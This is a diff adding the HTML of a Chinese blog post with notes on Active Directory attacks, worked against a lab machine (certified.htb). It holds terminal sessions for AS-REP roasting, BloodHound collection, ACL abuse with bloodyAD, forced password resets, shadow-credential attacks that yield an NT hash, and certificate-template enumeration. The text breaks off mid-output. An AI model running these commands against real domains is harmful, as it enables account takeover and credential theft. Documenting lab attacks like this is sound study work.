@@ -1,0 +1,747 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="比较乱，梦到哪句写哪句 不管干什么事，同步域控时间准没错。 AS-REP Roasting攻击1234567891011121314┌──(root㉿kaada)-[&#x2F;home&#x2F;kali&#x2F;Desktop]└─# impacket-GetNPUsers -usersfile users.txt -no-pass -dc-ip 10.129.231.186 certified.htb&#x2F;    Impa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ad攻击小记">
+<meta property="og:url" content="http://example.com/2026/02/18/ad%E6%94%BB%E5%87%BB%E5%B0%8F%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="比较乱，梦到哪句写哪句 不管干什么事，同步域控时间准没错。 AS-REP Roasting攻击1234567891011121314┌──(root㉿kaada)-[&#x2F;home&#x2F;kali&#x2F;Desktop]└─# impacket-GetNPUsers -usersfile users.txt -no-pass -dc-ip 10.129.231.186 certified.htb&#x2F;    Impa">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-02-18T12:27:30.000Z">
+<meta property="article:modified_time" content="2026-02-19T11:59:51.188Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="杂记">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ad攻击小记 - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ad攻击小记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-18 20:27" pubdate>
+          February 18, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ad攻击小记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>比较乱，梦到哪句写哪句</p>
+<p>不管干什么事，同步域控时间准没错。</p>
+<h2 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS-REP Roasting攻击"></a><strong>AS-REP Roasting攻击</strong></h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># impacket-GetNPUsers -usersfile users.txt -no-pass -dc-ip 10.129.231.186 certified.htb/    </span><br>Impacket v0.<span class="hljs-number">14.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">Administrator</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">judith</span>.mader doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">management_svc</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">ca_operator</span> doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">alexander</span>.huges doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">harry</span>.wilson doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br>[-] <span class="hljs-keyword">User</span> <span class="hljs-title">gregory</span>.cameron doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="bloodhound-python收集域信息"><a href="#bloodhound-python收集域信息" class="headerlink" title="bloodhound-python收集域信息"></a>bloodhound-python收集域信息</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# bloodhound-python -c <span class="hljs-keyword">All</span> -u judith.mader -p judith09 -ns <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span> -d certified.htb -dc dc01.certified.htb <span class="hljs-comment">--zip</span><br><span class="hljs-keyword">INFO</span>: BloodHound.py <span class="hljs-keyword">for</span> BloodHound LEGACY (BloodHound <span class="hljs-number">4.2</span> <span class="hljs-keyword">and</span> <span class="hljs-number">4.3</span>)<br><span class="hljs-built_in">WARNING</span>: Could <span class="hljs-keyword">not</span> find a <span class="hljs-keyword">global</span> catalog <span class="hljs-keyword">server</span>, assuming the <span class="hljs-keyword">primary</span> DC has this <span class="hljs-keyword">role</span><br><span class="hljs-keyword">If</span> this gives errors, either specify a hostname <span class="hljs-keyword">with</span> -gc <span class="hljs-keyword">or</span> <span class="hljs-keyword">disable</span> gc resolution <span class="hljs-keyword">with</span> <span class="hljs-comment">--disable-autogc</span><br><span class="hljs-keyword">INFO</span>: Getting TGT <span class="hljs-keyword">for</span> <span class="hljs-keyword">user</span><br><span class="hljs-built_in">WARNING</span>: Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> Kerberos TGT. Falling back <span class="hljs-keyword">to</span> NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br><span class="hljs-keyword">INFO</span>: Connecting <span class="hljs-keyword">to</span> LDAP <span class="hljs-keyword">server</span>: dc01.certified.htb<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">1</span> domains<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">1</span> domains <span class="hljs-keyword">in</span> the forest<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">1</span> computers<br><span class="hljs-keyword">INFO</span>: Connecting <span class="hljs-keyword">to</span> LDAP <span class="hljs-keyword">server</span>: dc01.certified.htb<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">10</span> users<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">53</span> <span class="hljs-keyword">groups</span><br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">2</span> gpos<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">1</span> ous<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">19</span> containers<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">Found</span> <span class="hljs-number">0</span> trusts<br><span class="hljs-keyword">INFO</span>: Starting computer enumeration <span class="hljs-keyword">with</span> <span class="hljs-number">10</span> workers<br><span class="hljs-keyword">INFO</span>: Querying computer: DC01.certified.htb<br><span class="hljs-built_in">WARNING</span>: DCE/RPC <span class="hljs-keyword">connection</span> failed: The NETBIOS <span class="hljs-keyword">connection</span> <span class="hljs-keyword">with</span> the remote host timed <span class="hljs-keyword">out</span>.<br><span class="hljs-keyword">INFO</span>: Done <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>M <span class="hljs-number">23</span>S<br><span class="hljs-keyword">INFO</span>: Compressing output <span class="hljs-keyword">into</span> <span class="hljs-number">20260218072121</span>_bloodhound.zip<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="成员对组拥有WriteOwner权限"><a href="#成员对组拥有WriteOwner权限" class="headerlink" title="成员对组拥有WriteOwner权限"></a>成员对组拥有WriteOwner权限</h2><p>先修改所有者，把组变成自己</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# bloodyAD -d certified.htb -u <span class="hljs-string">&#x27;judith.mader&#x27;</span> -p <span class="hljs-string">&#x27;judith09&#x27;</span> <span class="hljs-comment">--host 10.129.231.186 set owner MANAGEMENT &#x27;judith.mader&#x27;</span><br>[+] <span class="hljs-built_in">Old</span> <span class="hljs-keyword">owner</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-729746778</span><span class="hljs-number">-2675978091</span><span class="hljs-number">-3820388244</span><span class="hljs-number">-512</span> <span class="hljs-keyword">is</span> now replaced <span class="hljs-keyword">by</span> judith.mader <span class="hljs-keyword">on</span> MANAGEMENT<br></code></pre></td></tr></table></figure>
+
+<p>再将自己赋予完全控制权。</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# bloodyAD -d certified.htb -u <span class="hljs-string">&#x27;judith.mader&#x27;</span> -p <span class="hljs-string">&#x27;judith09&#x27;</span> --host <span class="hljs-number">10.129</span>.<span class="hljs-number">231.186</span> <span class="hljs-keyword">add</span> genericAll MANAGEMENT <span class="hljs-string">&#x27;judith.mader&#x27;</span><br>[+] judith.mader <span class="hljs-keyword">has</span> now GenericAll <span class="hljs-keyword">on</span> MANAGEMENT<br>                                                     <br></code></pre></td></tr></table></figure>
+
+<p>将自己加入该组。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# bloodyAD -d certified.htb -u <span class="hljs-string">&#x27;judith.mader&#x27;</span> -p <span class="hljs-string">&#x27;judith09&#x27;</span> --host 10.129.231.186 <span class="hljs-built_in">add</span> groupMember MANAGEMENT <span class="hljs-string">&#x27;judith.mader&#x27;</span><br>[+] judith.mader added <span class="hljs-keyword">to</span> MANAGEMENT<br></code></pre></td></tr></table></figure>
+
+<h2 id="成员（组）对组（成员）拥有GenericWrite权限"><a href="#成员（组）对组（成员）拥有GenericWrite权限" class="headerlink" title="成员（组）对组（成员）拥有GenericWrite权限"></a>成员（组）对组（成员）拥有GenericWrite权限</h2><p>修改成员的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# bloodyAD -d certified.htb -u <span class="hljs-string">&#x27;judith.mader&#x27;</span> -p <span class="hljs-string">&#x27;judith09&#x27;</span> --host 10.129.231.186 <span class="hljs-built_in">set</span> password MANAGEMENT_SVC <span class="hljs-string">&#x27;Pwned12345!&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>不过有时候会失败。</p>
+<p>定向 AS-REP Roasting</p>
+<p>对域控有GenericWrite权限（？？？实战中真有可能吗）</p>
+<p>打RBCD</p>
+<h2 id="影子凭据攻击"><a href="#影子凭据攻击" class="headerlink" title="影子凭据攻击"></a>影子凭据攻击</h2><blockquote>
+<p><em>在获取高权限用户后，通过给目标用户添加Shadow Credential（msDS-KeyCredentialLink属性），结合相关攻击工具获取到.pfx私钥证书文件，之后使用.pfx文件申请目标用户的TGT，进而得到其NTLM Hash。</em></p>
+</blockquote>
+<p>在使用影子凭据之前记得先把时间和域控同步</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿kaada)-[/<span class="hljs-keyword">opt</span>/get_dc_time]<br>└─# <span class="hljs-keyword">python3</span> get_dc_time.<span class="hljs-keyword">py</span> -s <span class="hljs-number">10.129</span>.<span class="hljs-number">231.186</span><br><span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">03</span>:<span class="hljs-number">49</span>:<span class="hljs-number">36.000000</span><br>Local time <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span>: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">03</span>:<span class="hljs-number">49</span>:<span class="hljs-number">36</span><br><br></code></pre></td></tr></table></figure>
+
+<p>使用pywhisker</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/opt/pywhisker<span class="hljs-number">-1.0</span><span class="hljs-number">.0</span>/pywhisker]<br>└─# python3 pywhisker.py -d <span class="hljs-string">&quot;certified.htb&quot;</span> -u <span class="hljs-string">&quot;judith.mader&quot;</span> -p <span class="hljs-string">&quot;judith09&quot;</span> --target <span class="hljs-string">&quot;management_svc&quot;</span> --action <span class="hljs-string">&quot;add&quot;</span> --dc-ip <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span> --use-ldaps<br>[*] <span class="hljs-symbol">Searching</span> for the target account<br>[*] <span class="hljs-symbol">Target</span> user found: <span class="hljs-symbol">CN</span>=management service,<span class="hljs-symbol">CN</span>=<span class="hljs-symbol">Users</span>,<span class="hljs-symbol">DC</span>=certified,<span class="hljs-symbol">DC</span>=htb<br>[*] <span class="hljs-symbol">Generating</span> certificate<br>[*] <span class="hljs-symbol">Certificate</span> generated<br>[*] <span class="hljs-symbol">Generating</span> <span class="hljs-symbol">KeyCredential</span><br>[*] <span class="hljs-symbol">KeyCredential</span> generated with <span class="hljs-symbol">DeviceID</span>: <span class="hljs-number">7</span>ba66598-d473<span class="hljs-number">-200</span>b-e335<span class="hljs-number">-73693201</span>fe6a<br>[*] <span class="hljs-symbol">Updating</span> the msDS-<span class="hljs-symbol">KeyCredentialLink</span> attribute of management_svc<br>[+] <span class="hljs-symbol">Updated</span> the msDS-<span class="hljs-symbol">KeyCredentialLink</span> attribute of the target object<br>[+] <span class="hljs-symbol">Saved</span> <span class="hljs-symbol">PFX</span> (#<span class="hljs-symbol">PKCS12</span>) certificate &amp; key at path: oigNgAOY.pfx<br>[*] <span class="hljs-symbol">Must</span> be used with password: <span class="hljs-symbol">F7ddKVbzqkaPtLgqVxFX</span><br>[*] <span class="hljs-symbol">A</span> <span class="hljs-symbol">TGT</span> can now be obtained with https://github.com/dirkjanm/<span class="hljs-symbol">PKINITtools</span><br></code></pre></td></tr></table></figure>
+
+<p>使用certipy</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# certipy-ad shadow auto -u <span class="hljs-string">&#x27;judith.mader@certified.htb&#x27;</span> -p <span class="hljs-string">&#x27;judith09&#x27;</span> -account <span class="hljs-symbol">Certipy</span> v4<span class="hljs-number">.8</span><span class="hljs-number">.2</span> - by <span class="hljs-symbol">Oliver</span> <span class="hljs-symbol">Lyak</span> (ly4k)<br><br>[*] <span class="hljs-symbol">Targeting</span> user <span class="hljs-string">&#x27;management_svc&#x27;</span><br>[*] <span class="hljs-symbol">Generating</span> certificate<br>[*] <span class="hljs-symbol">Certificate</span> generated<br>[*] <span class="hljs-symbol">Generating</span> <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span><br>[*] <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> generated with <span class="hljs-symbol">DeviceID</span> <span class="hljs-string">&#x27;91c77677-13a9-3225-4533-8a5ec50d7c90&#x27;</span><br>[*] <span class="hljs-symbol">Adding</span> <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> with device <span class="hljs-symbol">ID</span> <span class="hljs-string">&#x27;91c77677-13a9-3225-4533-8a5ec50d7c90&#x27;</span> to the <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;management_svc&#x27;</span><br>[*] <span class="hljs-symbol">Successfully</span> added <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> with device <span class="hljs-symbol">ID</span> <span class="hljs-string">&#x27;91c77677-13a9-3225-4533-8a5ec50d7c90&#x27;</span> to the <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;management_svc&#x27;</span><br>[*] <span class="hljs-symbol">Authenticating</span> as <span class="hljs-string">&#x27;management_svc&#x27;</span> with the certificate<br>[*] <span class="hljs-symbol">Using</span> principal: management_svc@certified.htb<br>[*] <span class="hljs-symbol">Trying</span> to get <span class="hljs-symbol">TGT</span>...<br>[*] <span class="hljs-symbol">Got</span> <span class="hljs-symbol">TGT</span><br>[*] <span class="hljs-symbol">Saved</span> credential cache to <span class="hljs-string">&#x27;management_svc.ccache&#x27;</span><br>[*] <span class="hljs-symbol">Trying</span> to retrieve <span class="hljs-symbol">NT</span> hash for <span class="hljs-string">&#x27;management_svc&#x27;</span><br>[*] <span class="hljs-symbol">Restoring</span> the old <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;management_svc&#x27;</span><br>[*] <span class="hljs-symbol">Successfully</span> restored the old <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;management_svc&#x27;</span><br>[*] <span class="hljs-symbol">NT</span> hash for <span class="hljs-string">&#x27;management_svc&#x27;</span>: a091c1832bcdd4677c28b5a6a1295584<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="成员（组）对组（成员）拥有GenericALL权限"><a href="#成员（组）对组（成员）拥有GenericALL权限" class="headerlink" title="成员（组）对组（成员）拥有GenericALL权限"></a>成员（组）对组（成员）拥有GenericALL权限</h2><p>同GenericWrite，可尝试修改密码。（这里是用的哈希凭证修改，密码修改同理）</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# bloodyAD -d certified.htb -u <span class="hljs-string">&#x27;management_svc&#x27;</span> -p <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584&#x27;</span> --host <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span> <span class="hljs-keyword">set</span> password <span class="hljs-comment">CA_OPERATOR</span> <span class="hljs-comment">&#x27;Pwned_CA_123!@#&#x27;</span><br>[+] Password <span class="hljs-comment">changed successfully!</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="No-Security-Extension-ESC9"><a href="#No-Security-Extension-ESC9" class="headerlink" title="No Security Extension - ESC9"></a>No Security Extension - ESC9</h2><p>使用Certipy查找域相关证书信息</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.186</span><br><span class="hljs-symbol">Certipy</span> v5<span class="hljs-number">.0</span><span class="hljs-number">.4</span> - by <span class="hljs-symbol">Oliver</span> <span class="hljs-symbol">Lyak</span> (ly4k)<br><br>[*] <span class="hljs-symbol">Finding</span> certificate templates<br>[*] <span class="hljs-symbol">Found</span> <span class="hljs-number">34</span> certificate templates<br>[*] <span class="hljs-symbol">Finding</span> certificate authorities<br>[*] <span class="hljs-symbol">Found</span> <span class="hljs-number">1</span> certificate authority<br>[*] <span class="hljs-symbol">Found</span> <span class="hljs-number">12</span> enabled certificate templates<br>[*] <span class="hljs-symbol">Finding</span> issuance policies<br>[*] <span class="hljs-symbol">Found</span> <span class="hljs-number">15</span> issuance policies<br>[*] <span class="hljs-symbol">Found</span> <span class="hljs-number">0</span> <span class="hljs-symbol">OIDs</span> linked to templates<br>[*] <span class="hljs-symbol">Retrieving</span> <span class="hljs-symbol">CA</span> configuration for <span class="hljs-string">&#x27;certified-DC01-CA&#x27;</span> via <span class="hljs-symbol">RRP</span><br>[!] <span class="hljs-symbol">Failed</span> to connect to remote registry. <span class="hljs-symbol">Service</span> should be starting now. <span class="hljs-symbol">Trying</span> again...<br>[*] <span class="hljs-symbol">Successfully</span> retrieved <span class="hljs-symbol">CA</span> configuration for <span class="hljs-string">&#x27;certified-DC01-CA&#x27;</span><br>[*] <span class="hljs-symbol">Checking</span> web enrollment for <span class="hljs-symbol">CA</span> <span class="hljs-string">&#x27;certified-DC01-CA&#x27;</span> @ <span class="hljs-string">&#x27;DC01.certified.htb&#x27;</span><br>[!] <span class="hljs-symbol">Error</span> checking web enrollment: timed out<br>[!] <span class="hljs-symbol">Use</span> -debug to print 